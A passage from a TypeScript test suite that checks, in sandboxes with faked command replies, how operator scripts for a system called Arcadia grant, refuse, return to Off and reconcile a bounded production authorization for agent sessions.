    expect(json).toMatchObject({ outcome: "refused", stage: "production_off", offState: "not_owned", restarted: false });
    expect(json.reason).toContain("G8 does not own it");
    const handoff = readFileSync(path.join(dir, "failure-handoff.md"), "utf8");
    expect(handoff).toContain("G8 did NOT turn it Off");
    expect(handoff).toContain("arcadia production deactivate --request-id");
    expect(box.calls()).not.toMatch(/deactivate/);
    expect(existsSync(path.join(box.root, "services-restarted"))).toBe(false);
  });

  it("turns G7's own exact policy Off through deactivate first, before resolving the workspace", () => {
    const box = sandboxFor(G8, {});
    writeFileSync(path.join(box.root, "replies.json"), JSON.stringify({
      "arcadia workspace resolve": workspaceReply(box.root),
      "arcadia production status": [rehearsalActive("grant-production-three-action-rehearsal-2026-10-04"), status("inactive")],
      "arcadia production deactivate": ok({ result: { policy: { desiredState: "inactive" } } }),
      "probe sessions": quiet
    }));
    expect(box.run(g8Env(box)).status).not.toBe(0);
    const { dir, json } = box.receipt();
    expect(json).toMatchObject({ outcome: "refused", stage: "restart_preconditions", offState: "confirmed", restarted: false });
    expect(json.reason).toContain("missing from the library");
    const ledger = readFileSync(path.join(dir, "intervention-ledger.jsonl"), "utf8");
    expect(ledger).toContain("revoked active policy grant-production-three-action-rehearsal-2026-10-04");
    expect(ledger).toContain("three-action-rehearsal/verify-final-rehearsal");
    const verbs = parsedCalls(box).filter((c) => c.tool === "mise").map((c) => c.args.slice(5, 7).join(" "));
    expect(verbs.indexOf("production deactivate")).toBeGreaterThan(-1);
    expect(verbs.indexOf("production deactivate")).toBeLessThan(verbs.indexOf("workspace resolve"));
  });

  it("records an already-Inactive policy, proves quiet observations, then refuses changed restart bytes without running them", () => {
    const box = sandboxFor(G8, {}, { ...realRecover, "recover-arcadia-host-services.sh": realRecover["recover-arcadia-host-services.sh"] + "# changed\n" });
    writeFileSync(path.join(box.root, "replies.json"), JSON.stringify({
      "arcadia workspace resolve": workspaceReply(box.root), "arcadia production status": status("inactive"), "probe sessions": quiet
    }));
    expect(box.run(g8Env(box)).status).not.toBe(0);
    const { dir, json } = box.receipt();
    expect(json).toMatchObject({ id: G8, outcome: "refused", stage: "restart_preconditions", offState: "confirmed", restarted: false, offRevision: 5, offEpoch: 3 });
    expect(json).not.toHaveProperty("rawProcessSignals");
    expect(json.reason).toContain("differs from its reviewed bytes");
    const ledger = readFileSync(path.join(dir, "intervention-ledger.jsonl"), "utf8").trim().split("\n").map((line) => JSON.parse(line).intervention);
    expect(ledger).toEqual(["none", "observation", "stopped"]);
    expect(readFileSync(path.join(dir, "observations-drain.jsonl"), "utf8").trim().split("\n")).toHaveLength(3);
    expect(existsSync(path.join(dir, "inactive-receipt.json"))).toBe(true);
    expect(existsSync(path.join(box.root, "services-restarted"))).toBe(false);
    expect(box.calls()).not.toMatch(/deactivate/);
  });

  it("refuses with Off confirmed when live work does not drain within the bound, never killing it", () => {
    const box = sandboxFor(G8, {}, realRecover);
    writeFileSync(path.join(box.root, "replies.json"), JSON.stringify({
      "arcadia workspace resolve": workspaceReply(box.root),
      "arcadia production status": status("inactive", { liveAdmissions: 1 }),
      "probe sessions": { stdout: JSON.stringify({ active: [{ id: "s1", project: "three-action-rehearsal", action: "write-start-marker", status: "running" }], fixtureSessions: [] }) }
    }));
    // A one-second drain bound keeps the case fast; `sleep` is a no-op fake.
    const script = path.join(box.scripts, `${G8}.sh`);
    writeFileSync(script, readFileSync(script, "utf8").replace("DRAIN_DEADLINE_SECONDS=1800", "DRAIN_DEADLINE_SECONDS=1"));
    expect(box.run(g8Env(box)).status).not.toBe(0);
    const { json } = box.receipt();
    expect(json).toMatchObject({ outcome: "refused", stage: "drain", offState: "confirmed", restarted: false });
    expect(json.reason).toContain("nothing was killed");
  });
});

// ---------------------------------------------------------------------------
// Happy paths. The copied script's pinned constants (installed-feature commits,
// reviewed restart hashes) are rebound to the throwaway checkout, exactly as
// the drain bound is above; every other byte is the reviewed script.

const FIXTURE_REPO_ID = "pmark/arcadia-three-action-rehearsal-t1";
const commitAll = (cwd: string, message: string) => {
  git(cwd, ["add", "-A"]);
  git(cwd, ["-c", "user.name=t", "-c", "user.email=t@t.test", "commit", "-q", "-m", message]);
  return git(cwd, ["rev-parse", "HEAD"]);
};
function createFixture(home: string) {
  const fixture = path.join(home, "tmp", "arcadia-three-action-rehearsal");
  mkdirSync(fixture, { recursive: true });
  writeFileSync(path.join(fixture, ".arcadia-three-action-rehearsal.json"), JSON.stringify({
    schema: "arcadia-three-action-rehearsal-fixture-v1", githubRepository: FIXTURE_REPO_ID, fixtureProject: "three-action-rehearsal",
    fixturePlan: "autonomous-three-action-rehearsal", actions: ["write-start-marker", "transform-start-marker", "verify-final-rehearsal"],
    provider: "claude-code-cli", agentProfile: "claude_build", validationCommand: "node scripts/check-rehearsal.mjs"
  }));
  git(fixture, ["init", "-q", "-b", "main"]);
  const root = commitAll(fixture, "genesis");
  git(fixture, ["remote", "add", "origin", `https://github.com/${FIXTURE_REPO_ID}.git`]);
  writeFileSync(path.join(fixture, ".git", "arcadia-three-action-first-packet-approval"), "review_1\n");
  return { fixture, root };
}
const rebind = (box: ReturnType<typeof sandboxFor>, id: string, replace: Array<[RegExp, string]>) => {
  const script = path.join(box.scripts, `${id}.sh`);
  let text = readFileSync(script, "utf8");
  for (const [pattern, value] of replace) {
    expect(text, String(pattern)).toMatch(pattern);
    text = text.replace(pattern, value);
  }
  writeFileSync(script, text);
};
const parsedCalls = (box: ReturnType<typeof sandboxFor>) => box.calls().trim().split("\n").filter((line) => line && !line.startsWith("git "))
  .map((line) => ({ tool: line.slice(0, line.indexOf(" ")), args: JSON.parse(line.slice(line.indexOf(" ") + 1)) as string[] }));
const arcadiaCallsFor = (box: ReturnType<typeof sandboxFor>, noun: string, verb: string) => parsedCalls(box).filter((c) => c.tool === "mise" && c.args[3] === "-s" && c.args[5] === noun && c.args[6] === verb);
const arcadiaCalls = (box: ReturnType<typeof sandboxFor>, verb: string) => parsedCalls(box).filter((c) => c.tool === "mise" && c.args[3] === "-s" && c.args[5] === "production" && c.args[6] === verb);

describe("G7 Grant previews and activates only the exact bound scope", () => {
  function grantBox(previewScope: Record<string, unknown> = {}, activationFingerprint = "fp-1") {
    const box = sandboxFor(G7, {});
    mkdirSync(path.join(box.checkout, "docs", "decisions"), { recursive: true });
    writeFileSync(path.join(box.checkout, "docs", "decisions", "0058-should-the-standing-managed-production-authorization-delegate-a-bounded.md"), "---\nstatus: approved\n---\n");
    const head = commitAll(box.checkout, "decision");
    git(box.checkout, ["push", "-q", "origin", "main"]);
    rebind(box, G7, [[/REQUIRED_COMMITS="[^"]+"/, `REQUIRED_COMMITS="${head}"`]]);
    const { root } = createFixture(box.home);
    const workspace = path.join(box.root, "martianrover");
    const g6 = path.join(box.scripts, "runs", "20000101T000000Z-1");
    mkdirSync(g6, { recursive: true });
    writeFileSync(path.join(g6, "receipt.json"), JSON.stringify({
      id: G6, outcome: "succeeded", finishedAt: new Date().toISOString().replace(/\.\d{3}Z$/, "Z"), arcadiaHead: head, brokerRevision: head,
      githubRepository: FIXTURE_REPO_ID, rootCommit: root, workspace, policyRevision: 5
    }));
    const actions = ["write-start-marker", "transform-start-marker", "verify-final-rehearsal"].map((a) => `three-action-rehearsal/${a}`);
    const scope = {
      projects: ["three-action-rehearsal"], plans: ["three-action-rehearsal/autonomous-three-action-rehearsal"], actions,
      providers: ["claude-code-cli"], maxConcurrentSessions: 1, mechanicalTransitions: ["validation", "acceptance", "pointer", "packet_approval"],
      remotePreservation: true, packetApprovalExpiresAt: "{{arg:--packet-approval-expires-at}}",
      integrationGrant: { decisionRef: "0058", expiresAt: "{{arg:--integration-grant-expires-at}}", actions }, ...previewScope
    };
    const own = ok({ read: { status: "ok", policy: { desiredState: "active", revision: 6, epoch: 4, authority: { requestId: G7 } } }, liveAdmissions: 0 });
    writeFileSync(path.join(box.root, "replies.json"), JSON.stringify({
      "arcadia workspace resolve": workspaceReply(box.root),
      "arcadia go-broker status": ok({ ready: true, revision: head, preservationTransport: { ready: true }, agentGoTransport: { ready: true } }),
      "arcadia production status": [status("inactive"), status("inactive"), own],
      "probe leases": { stdout: JSON.stringify({ active: 0, fixtureActive: [] }) },
      "node preflight": { stdout: "Hermetic three-Action rehearsal passed\n" },
      "arcadia production preview": ok({ preview: { expectedRevision: 5, scope, scopeFingerprint: "fp-1", unmatched: { projects: [], plans: [] } } }),
      "arcadia production activate": ok({ result: { policy: { desiredState: "active", revision: 6, authority: { requestId: G7, scopeFingerprint: activationFingerprint } } } }),
      "arcadia production deactivate": ok({ result: { policy: { desiredState: "inactive" } } })
    }));
    const env = { ARCADIA_OPERATOR_SCRIPT_ID: G7, ARCADIA_OPERATOR_SCRIPT_DESCRIPTOR: path.join(box.scripts, `${G7}.json`) };
    return { box, env, actions };
  }

  it("replays the rehearsal, previews at the current revision, and activates the previewed fingerprint once", () => {
    const { box, env, actions } = grantBox();
    const result = box.run(env);
    expect(result.status, result.stdout + result.stderr).toBe(0);
    const [, dir] = box.runDirs().sort();
    const json = JSON.parse(readFileSync(path.join(dir, "receipt.json"), "utf8"));
    expect(json).toMatchObject({ id: G7, outcome: "succeeded", activated: true, scopeFingerprint: "fp-1", policyRevisionBefore: 5, policyRevisionAfter: 6, githubRepository: FIXTURE_REPO_ID });
    expect(json.neverAuthorizes).toContain("GitHub merge, a base-branch push");
    expect(readFileSync(path.join(dir, "receipt.md"), "utf8")).toContain("#925");
    const order = parsedCalls(box).map((c) => (c.args[2] === "node" ? "replay" : c.args.slice(5, 7).join(" ")));
    expect(order.indexOf("replay")).toBeLessThan(order.indexOf("production preview"));
    expect(order.indexOf("production preview")).toBeLessThan(order.indexOf("production activate"));
    const [activate] = arcadiaCalls(box, "activate");
    expect(arcadiaCalls(box, "activate")).toHaveLength(1);
    const args = activate.args;
    const value = (flag: string) => args[args.indexOf(flag) + 1];
    expect(args).toContain("--remote-preservation");
    expect(value("--expected-revision")).toBe("5");
    expect(value("--request-id")).toBe(G7);
    expect(value("--concurrency")).toBe("1");
    expect(value("--provider")).toBe("claude-code-cli");
    expect(value("--transitions")).toBe("validation,acceptance,pointer,packet_approval");
    expect(value("--integration-grant-decision")).toBe("0058");
    expect(args.filter((_a, i) => args[i - 1] === "--integration-grant-action")).toEqual(actions);
    expect(args.filter((_a, i) => args[i - 1] === "--action")).toEqual(actions);
    const expiry = Date.parse(value("--packet-approval-expires-at"));
    expect(expiry - Date.now()).toBeGreaterThan(11 * 3600e3);
    expect(expiry - Date.now()).toBeLessThanOrEqual(12 * 3600e3);
    expect(value("--integration-grant-expires-at")).toBe(value("--packet-approval-expires-at"));
    expect(arcadiaCalls(box, "deactivate")).toHaveLength(0);
  });

  it("refuses a preview without remote preservation and never activates", () => {
    const { box, env } = grantBox({ remotePreservation: undefined });
    expect(box.run(env).status).not.toBe(0);
    const [, dir] = box.runDirs().sort();
    expect(JSON.parse(readFileSync(path.join(dir, "receipt.json"), "utf8"))).toMatchObject({ outcome: "refused", stage: "preview", activated: false });
    expect(arcadiaCalls(box, "activate")).toHaveLength(0);
  });

  it("returns only its own Grant to Off when the active fingerprint differs from the preview", () => {
    const { box, env } = grantBox({}, "fp-other");
    expect(box.run(env).status).not.toBe(0);
    const [, dir] = box.runDirs().sort();
    expect(JSON.parse(readFileSync(path.join(dir, "receipt.json"), "utf8"))).toMatchObject({ outcome: "refused", stage: "activate", activated: true, offCleanup: "returned_off" });
    const [off] = arcadiaCalls(box, "deactivate");
    expect(off.args[off.args.indexOf("--request-id") + 1]).toMatch(new RegExp(`^${G7}-.*-off$`));
  });

  it("refuses a stale G6 receipt", () => {
    const { box, env } = grantBox();
    const receiptPath = path.join(box.scripts, "runs", "20000101T000000Z-1", "receipt.json");
    const stale = JSON.parse(readFileSync(receiptPath, "utf8"));
    writeFileSync(receiptPath, JSON.stringify({ ...stale, finishedAt: "2026-01-01T00:00:00Z" }));
    expect(box.run(env).status).not.toBe(0);
    const [, dir] = box.runDirs().sort();
    expect(JSON.parse(readFileSync(path.join(dir, "receipt.json"), "utf8")).reason).toMatch(/G6 preflight is \d+s old/);
    expect(parsedCalls(box).some((c) => c.args[2] === "node")).toBe(false);
  });

  const override = (box: ReturnType<typeof sandboxFor>, patch: Replies) => {
    const file = path.join(box.root, "replies.json");
    writeFileSync(file, JSON.stringify({ ...JSON.parse(readFileSync(file, "utf8")), ...patch }));
  };
  const g7Receipt = (box: ReturnType<typeof sandboxFor>) => {
    const [, dir] = box.runDirs().sort();
    return { dir, json: JSON.parse(readFileSync(path.join(dir, "receipt.json"), "utf8")), handoff: readFileSync(path.join(dir, "failure-handoff.md"), "utf8") };
  };
  const ownActive = ok({ read: { status: "ok", policy: { desiredState: "active", revision: 6, epoch: 4, authority: { requestId: G7 } } }, liveAdmissions: 0 });

  it.each([
    ["exits non-zero after the transaction committed", { status: 1, stderr: "lost connection after commit" }],
    ["times out after the transaction committed", { status: 124 }],
    ["prints unparsable output after the transaction committed", { stdout: "not json" }]
  ])("reads production status back when activate %s and returns its own Grant to Off", (_label, activateReply) => {
    const { box, env } = grantBox();
    override(box, { "arcadia production activate": activateReply, "arcadia production status": [status("inactive"), status("inactive"), ownActive] });
    expect(box.run(env).status).not.toBe(0);
    const { json, handoff } = g7Receipt(box);
    expect(json).toMatchObject({ outcome: "refused", stage: "activate", activated: true, offCleanup: "returned_off" });
    expect(handoff).toContain("returned only this Grant to Off and the Off was confirmed");
    expect(handoff).not.toContain("policy was not changed");
    expect(arcadiaCalls(box, "deactivate")).toHaveLength(1);
  });

  it("runs the same cleanup when SIGTERM arrives during activation", async () => {
    const { box, env } = grantBox();
    const marker = path.join(box.root, "activate-started");
    const release = path.join(box.root, "activate-release");
    const activated = JSON.stringify({ ok: true, data: { result: { policy: { desiredState: "active", revision: 6, authority: { requestId: G7, scopeFingerprint: "fp-1" } } } } });
    // The fake activate commits (status reads Active afterwards) and then stalls until the test
    // releases it, using the real /bin/sleep (the box's fake `sleep` returns at once). Bash runs
    // the TERM trap only after this foreground command returns, so killing before releasing is
    // deterministic. The stall is capped at about 20 seconds.
    const stall = `touch ${JSON.stringify(marker)}; i=0; while [ ! -e ${JSON.stringify(release)} ] && [ $i -lt 200 ]; do /bin/sleep 0.1; i=$((i+1)); done; printf '%s' '${activated}'`;
    override(box, {
      "arcadia production activate": { exec: stall },
      "arcadia production status": [status("inactive"), status("inactive"), ownActive]
    });
    const child = spawn("bash", [path.join(box.scripts, `${G7}.sh`), "run"], {
      env: { ...process.env, PATH: `${path.join(box.root, "bin")}:${process.env.PATH}`, HOME: box.home, FAKE_ROOT: box.root, ...env, CODEX_SANDBOX: "" },
      stdio: "ignore"
    });
    const exited = new Promise<number | null>((resolve) => child.once("exit", (code) => resolve(code)));
    try {
      for (let i = 0; i < 300 && !existsSync(marker); i++) await new Promise((r) => setTimeout(r, 100));
      expect(existsSync(marker)).toBe(true);
      expect(child.exitCode).toBeNull();
      child.kill("SIGTERM");
      await new Promise((r) => setTimeout(r, 200));
      writeFileSync(release, "");
      expect(await exited).not.toBe(0);
    } finally {
      writeFileSync(release, "");
      if (child.exitCode === null && child.signalCode === null) child.kill("SIGKILL");
    }
    const { json, handoff } = g7Receipt(box);
    expect(json.reason).toContain("interrupted by a signal");
    expect(json).toMatchObject({ outcome: "refused", activated: true, offCleanup: "returned_off" });
    expect(handoff).toContain("returned only this Grant to Off");
    expect(arcadiaCalls(box, "deactivate")).toHaveLength(1);
  });

  it("records UNKNOWN and directs G8 when production status cannot be read after a failed activate", () => {
    const { box, env } = grantBox();
    override(box, { "arcadia production activate": { status: 124 }, "arcadia production status": [status("inactive"), status("inactive"), { status: 1, stderr: "database locked" }] });
    expect(box.run(env).status).not.toBe(0);
    const { json, handoff } = g7Receipt(box);
    expect(json).toMatchObject({ outcome: "refused", stage: "activate", activated: "unknown", offCleanup: "UNKNOWN" });
    expect(handoff).toContain("may be ACTIVE. Run the G8 terminal-Off action NOW");
    expect(arcadiaCalls(box, "deactivate")).toHaveLength(0);
  });

  it("reports an observed Inactive policy, not an unchanged one, when a failed activate did not commit", () => {
    const { box, env } = grantBox();
    override(box, { "arcadia production activate": { status: 1, stderr: "revision conflict" }, "arcadia production status": status("inactive") });
    expect(box.run(env).status).not.toBe(0);
    const { json, handoff } = g7Receipt(box);
    expect(json).toMatchObject({ outcome: "refused", stage: "activate", activated: false, offCleanup: "not_active" });
    expect(handoff).toContain("production status afterwards reads Inactive");
  });

  it("never turns off another request's Active policy after a failed activate", () => {
    const { box, env } = grantBox();
    override(box, { "arcadia production activate": { status: 1 }, "arcadia production status": [status("inactive"), status("inactive"), status("active")] });
    expect(box.run(env).status).not.toBe(0);
    expect(g7Receipt(box).json).toMatchObject({ offCleanup: "other_grant_active", activated: false });
    expect(arcadiaCalls(box, "deactivate")).toHaveLength(0);
  });

  it("refuses when the fingerprint changes between preview and the immediate pre-activation preview", () => {
    const { box, env } = grantBox();
    const replies = JSON.parse(readFileSync(path.join(box.root, "replies.json"), "utf8"));
    const first = replies["arcadia production preview"];
    const second = { stdout: first.stdout.replace('"scopeFingerprint":"fp-1"', '"scopeFingerprint":"fp-2"') };
    override(box, { "arcadia production preview": [first, second] });
    expect(box.run(env).status).not.toBe(0);
    expect(g7Receipt(box).json).toMatchObject({ outcome: "refused", stage: "preview_recheck", activated: false, offCleanup: "not_attempted" });
    expect(arcadiaCalls(box, "preview")).toHaveLength(2);
    expect(arcadiaCalls(box, "activate")).toHaveLength(0);
  });

  it("refuses when production moved during the hermetic replay", () => {
    const { box, env } = grantBox();
    override(box, { "arcadia production status": [status("inactive"), status("active")] });
    expect(box.run(env).status).not.toBe(0);
    expect(g7Receipt(box).json).toMatchObject({ outcome: "refused", stage: "recheck_after_replay" });
    expect(arcadiaCalls(box, "preview")).toHaveLength(0);
  });

  it.each([
    ["arcadiaHead", "0000000000000000000000000000000000000000", "different main"],
    ["brokerRevision", "1111111111111111111111111111111111111111", "different main"],
    ["githubRepository", "pmark/arcadia-three-action-rehearsal-other", "different main"],
    ["rootCommit", "2222222222222222222222222222222222222222", "different main"],
    ["workspace", "/elsewhere/martianrover", "different main"],
    ["policyRevision", 4, "policy revision moved"]
  ])("refuses a G6 receipt bound to a different %s before any replay", (field, value, reason) => {
    const { box, env } = grantBox();
    const receiptPath = path.join(box.scripts, "runs", "20000101T000000Z-1", "receipt.json");
    writeFileSync(receiptPath, JSON.stringify({ ...JSON.parse(readFileSync(receiptPath, "utf8")), [field]: value }));
    expect(box.run(env).status).not.toBe(0);
    expect(g7Receipt(box).json.reason).toContain(reason);
    expect(parsedCalls(box).some((c) => c.args[2] === "node")).toBe(false);
    expect(arcadiaCalls(box, "preview")).toHaveLength(0);
  });
});

describe("G8 proves terminal Off through the reviewed restart and reconciles committed work", () => {
  function offBox(preserveSecond: boolean) {
    const box = sandboxFor(G8, {}, realRecover);
    const digest = (file: string) => createHash("sha256").update(readFileSync(file)).digest("hex");
    // The restart implementation lives in the operator's home; its pin is rebound to the throwaway one.
    const impl = path.join(box.home, ".codex", "skills", "restart-arcadia-services", "scripts", "restart-services.sh");
    mkdirSync(path.dirname(impl), { recursive: true });
    writeFileSync(impl, "#!/bin/sh\nexit 0\n", { mode: 0o755 });
    rebind(box, G8, [[/RESTART_IMPL_SHA256="[0-9a-f]{64}"/, `RESTART_IMPL_SHA256="${digest(impl)}"`]]);
    const { fixture, root } = createFixture(box.home);
    // Session 1 integrated into fixture main; Session 2 left a committed candidate.
    writeFileSync(path.join(fixture, "MARKER.md"), "three-action rehearsal start\n");
    const integrated = commitAll(fixture, "A");
    const candidate = path.join(box.root, "candidate-b");
    git(box.root, ["clone", "-q", fixture, candidate]);
    writeFileSync(path.join(candidate, "MARKER.md"), "three-action rehearsal start\nTHREE-ACTION REHEARSAL START\n");
    const candidateTip = commitAll(candidate, "B");
    const sessions = [
      { id: "s1", action_id: "write-start-marker", status: "completed", branch: "agent/a", worktree_path: path.join(box.root, "gone"), base_revision: root, preservation: null },
      { id: "s2", action_id: "transform-start-marker", status: "completed", branch: "agent/b", worktree_path: candidate, base_revision: integrated, preservation: preserveSecond ? { commit_sha: candidateTip, preservation_state: "IN PR", pull_request_url: "https://github.com/x/pull/2" } : null },
      { id: "s3", action_id: "verify-final-rehearsal", status: "failed", branch: "agent/c", worktree_path: path.join(box.root, "never"), base_revision: candidateTip, preservation: null }
    ];
    git(fixture, ["branch", "agent/a", integrated]);
    writeFileSync(path.join(box.root, "replies.json"), JSON.stringify({
      "arcadia workspace resolve": workspaceReply(box.root),
      "arcadia production status": status("inactive"),
      "arcadia worker status": { stdout: "Worker: running (PID 42)\n" },
      "probe sessions": { stdout: JSON.stringify({ active: [], fixtureSessions: sessions }) },
      // Calls made by the real recover-arcadia-host-services action.
      "pnpm arcadia go-broker install": { stdout: "installed\n" },
      "pnpm arcadia worker status": { stdout: "Worker: running (PID 42)\n" },
      "cli go-broker status": ok({ preservationTransport: { ready: true }, agentGoTransport: { ready: true } })
    }));
    return { box, candidate, candidateTip };
  }

  it("restarts once through the pinned path, observes quiet before and after, and writes the receipts and ledger", () => {
    const { box } = offBox(true);
    // Override variables that would redirect the pinned restart path are stripped before it runs.
    const result = box.run({ ...g8Env(box), ARCADIA_RESTART_SCRIPT: "/elsewhere/restart.sh", ARCADIA_RESTART_ATTEMPTS: "9", ARCADIA_MISE_BIN: "/elsewhere/mise", ARCADIA_NODE_BIN: "/elsewhere/node", ARCADIA_WORKSPACE_DEFAULT: "/elsewhere" });
    expect(result.status, result.stdout + result.stderr).toBe(0);
    const { dir, json } = box.receipt();
    expect(json).toMatchObject({ id: G8, outcome: "succeeded", offState: "confirmed", restarted: true });
    expect(existsSync(path.join(box.root, "services-restarted"))).toBe(true);
    expect(parsedCalls(box).some((c) => c.tool === "pnpm" && c.args.join(" ") === "arcadia go-broker install")).toBe(true);
    const restart = JSON.parse(readFileSync(path.join(dir, "restart-receipt.json"), "utf8"));
    expect(restart).toMatchObject({ path: "recover-arcadia-host-services", exitStatus: 0, workerAfter: "Worker: running (PID 42)" });
    const states = readFileSync(path.join(dir, "work-reconciliation.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l).state);
    expect(states).toEqual(["integrated", "preserved", "no_committed_work"]);
    const ledger = readFileSync(path.join(dir, "intervention-ledger.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l).intervention);
    expect(ledger).toEqual(["none", "observation", "service_restart", "observation", "completed"]);
    expect(readFileSync(path.join(dir, "observations-post_restart.jsonl"), "utf8").trim().split("\n")).toHaveLength(3);
  });

  it("refuses unreconciled committed work and leaves the candidate exactly as it was", () => {
    const { box, candidate, candidateTip } = offBox(false);
    expect(box.run(g8Env(box)).status).not.toBe(0);
    const { json } = box.receipt();
    expect(json).toMatchObject({ outcome: "refused", stage: "reconcile_work", offState: "confirmed", restarted: true });
    expect(json.reason).toContain("retained untouched");
    expect(git(candidate, ["rev-parse", "HEAD"])).toBe(candidateTip);
    expect(git(candidate, ["status", "--porcelain"])).toBe("");
  });
});

describe("G8 reconciles a preserved candidate settled once on top of its receipt, through the real read-only helper", () => {
  const RECEIPT_ID = "asksettle_bb9ebe9310814f3ab1";
  const PR_URL = `https://github.com/${FIXTURE_REPO_ID}/pull/1`;
  function settledBox(remoteBranchAt: "tip" | "receipt", extra?: (repo: string) => void) {
    const box = sandboxFor(G8, {}, realRecover);
    const digest = (file: string) => createHash("sha256").update(readFileSync(file)).digest("hex");
    const impl = path.join(box.home, ".codex", "skills", "restart-arcadia-services", "scripts", "restart-services.sh");
    mkdirSync(path.dirname(impl), { recursive: true });
    writeFileSync(impl, "#!/bin/sh\nexit 0\n", { mode: 0o755 });
    rebind(box, G8, [[/RESTART_IMPL_SHA256="[0-9a-f]{64}"/, `RESTART_IMPL_SHA256="${digest(impl)}"`]]);
    const { root } = createFixture(box.home);
    // The candidate preserved, then settled once by agent-ask settle --apply, as the tick does.
    const candidate = path.join(box.root, "candidate-a");
    mkdirSync(candidate);
    const { receipt } = buildPreservedCandidate(candidate);
    const tip = settle(candidate, receipt, { receiptId: RECEIPT_ID, extra });
    const branch = git(candidate, ["branch", "--show-current"]);
    // The real helper reads the settlement record from the resolved workspace, read-only.
    const workspace = path.join(box.root, "martianrover");
    initWorkspace(workspace);
    seedSettlement(workspace, { receiptId: RECEIPT_ID, receiptCommit: receipt, documentsCommit: tip });
    const sessions = [{ id: "s1", action_id: "write-start-marker", status: "completed", branch, worktree_path: candidate, base_revision: root,
      preservation: { commit_sha: receipt, preservation_state: "IN PR", pull_request_url: PR_URL } }];
    writeFileSync(path.join(box.root, "replies.json"), JSON.stringify({
      "arcadia workspace resolve": workspaceReply(box.root),
      "arcadia production status": status("inactive"),
      "arcadia worker status": { stdout: "Worker: running (PID 42)\n" },
      "probe sessions": { stdout: JSON.stringify({ active: [], fixtureSessions: sessions }) },
      "probe classify": { passthrough: "probe" },
      "gh api": { stdout: `${remoteBranchAt === "tip" ? tip : receipt}\n` },
      "gh pr view": { stdout: JSON.stringify({ url: PR_URL, state: "OPEN", headRefName: branch, headRefOid: tip, isCrossRepository: false }) },
      "pnpm arcadia go-broker install": { stdout: "installed\n" },
      "pnpm arcadia worker status": { stdout: "Worker: running (PID 42)\n" },
      "cli go-broker status": ok({ preservationTransport: { ready: true }, agentGoTransport: { ready: true } })
    }));
    return { box, candidate, receipt, tip, branch };
  }
  const rows = (dir: string) => readFileSync(path.join(dir, "work-reconciliation.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l));
  const ghReads = (box: ReturnType<typeof sandboxFor>) => parsedCalls(box).filter((c) => c.tool === "gh").map((c) => c.args.slice(0, 2).join(" "));

  it("proves terminal Off with the settled candidate preserved, reading GitHub only", () => {
    const { box, candidate, receipt, tip, branch } = settledBox("tip");
    const result = box.run(g8Env(box));
    expect(result.status, result.stdout + result.stderr).toBe(0);
    const { dir, json } = box.receipt();
    expect(json).toMatchObject({ id: G8, outcome: "succeeded", stage: "complete", offState: "confirmed", restarted: true });
    expect(rows(dir)).toEqual([expect.objectContaining({
      session: "s1", state: "preserved", basis: "settled_descendant", tip, preservedCommit: receipt, branch,
      settlement: expect.objectContaining({ commit: tip, receiptId: RECEIPT_ID })
    })]);
    expect(ghReads(box)).toEqual([`api repos/${FIXTURE_REPO_ID}/git/ref/heads/${branch}`, "pr view"]);
    expect(git(candidate, ["rev-parse", "HEAD"])).toBe(tip);
    expect(git(candidate, ["status", "--porcelain"])).toBe("");
  });

  it("refuses a settlement that exists only locally, naming the reason and leaving the candidate untouched", () => {
    const { box, candidate, tip } = settledBox("receipt");
    expect(box.run(g8Env(box)).status).not.toBe(0);
    const { dir, json } = box.receipt();
    expect(json).toMatchObject({ outcome: "refused", stage: "reconcile_work", offState: "confirmed", restarted: true });
    expect(json.reason).toContain("retained untouched");
    expect(rows(dir)).toEqual([expect.objectContaining({ state: "committed_unreconciled", refusal: "local_only_tip" })]);
    expect(git(candidate, ["rev-parse", "HEAD"])).toBe(tip);
  });

  it("refuses a code-changing descendant before reading GitHub", () => {
    const { box } = settledBox("tip", (repo) => writeFileSync(path.join(repo, "MARKER.md"), "changed\n"));
    expect(box.run(g8Env(box)).status).not.toBe(0);
    const { dir, json } = box.receipt();
    expect(json).toMatchObject({ outcome: "refused", stage: "reconcile_work" });
    expect(rows(dir)).toEqual([expect.objectContaining({ state: "committed_unreconciled", refusal: "code_changing_descendant" })]);
    expect(ghReads(box)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// G1's generated fixture, judged by Arcadia's own code. The fixture is rendered
// from the script's own heredocs (its constants and `render_fixture`), never
// from a copy in this test, so a defect in the script's bytes is what fails.

const PRE_FIX_CRITERION = '      - "$VALIDATION_COMMAND" passes.';
const FIXED_CRITERION = "      - The genesis check $VALIDATION_COMMAND passes.";
function renderG1Fixture(directory: string, script = source(G1), repository = FIXTURE_REPO_ID, date = "2026-10-04") {
  const constants = script.slice(0, script.indexOf('case "${1:-run}" in')).split("\n").filter((line) => /^[A-Z_]+=/.test(line) && !line.includes("$(")).join("\n");
  const end = "} # end render_fixture";
  const start = script.indexOf("render_fixture() {");
  expect(start, "G1 defines render_fixture").toBeGreaterThan(-1);
  expect(script.indexOf(end), "G1 closes render_fixture").toBeGreaterThan(start);
  const program = [constants, `REPO=${JSON.stringify(repository)}`, `FIXTURE_DATE=${date}`, script.slice(start, script.indexOf(end) + end.length), `render_fixture ${JSON.stringify(directory)}`].join("\n");
  const run = spawnSync("bash", ["-c", program], { encoding: "utf8" });
  expect(run.status, run.stderr).toBe(0);
  return directory;
}
const ACTIONS = ["write-start-marker", "transform-start-marker", "verify-final-rehearsal"];
const g1ValidationRules = () => {
  const text = source(G1);
  const marker = "VALIDATION_RULES='";
  const start = text.indexOf(marker) + marker.length;
  return text.slice(start, text.indexOf("'\n", start));
};
/** The script's own validation probe and rules, run for real against one directory. */
function g1Validation(directory: string) {
  const program = source(G1).split(`cat > "$RUN_DIR/validate-fixture.mjs" <<'NODE'\n`)[1].split("\nNODE")[0];
  const env: NodeJS.ProcessEnv = { ...process.env };
  delete env.VITEST;
  const probe = spawnSync(process.execPath, ["--import", "tsx", "--input-type=module", "-", directory, path.join(temp("arcadia-g1-validation-"), "workspace"), "Three Action Rehearsal", "autonomous-three-action-rehearsal"], { cwd: repoRoot, input: program, env, encoding: "utf8", timeout: 60_000 });
  expect(probe.status, probe.stderr).toBe(0);
  const verdict = spawnSync("jq", ["-r", "--arg", "p", "three-action-rehearsal", "--arg", "plan", "autonomous-three-action-rehearsal", "--arg", "a", ACTIONS[0], "--arg", "b", ACTIONS[1], "--arg", "c", ACTIONS[2], g1ValidationRules()], { input: probe.stdout, encoding: "utf8" });
